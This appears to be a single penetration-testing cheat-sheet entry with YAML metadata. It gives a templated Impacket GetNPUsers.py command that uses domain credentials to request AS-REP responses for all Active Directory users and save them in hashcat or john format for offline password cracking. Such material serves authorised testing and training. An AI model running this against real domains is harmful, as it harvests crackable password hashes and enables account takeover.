---
id: 8290b2ba-e4b5-4373-874e-bf14755ada84
name: check ASREPRoast for all domain users (credentials required)
type: command
executor: bash
data: 'python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request
  -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>

  '
output: null
created_at: '2020-07-14T18:14:44.766069+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# check ASREPRoast for all domain users (credentials required)

```bash
python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>

```


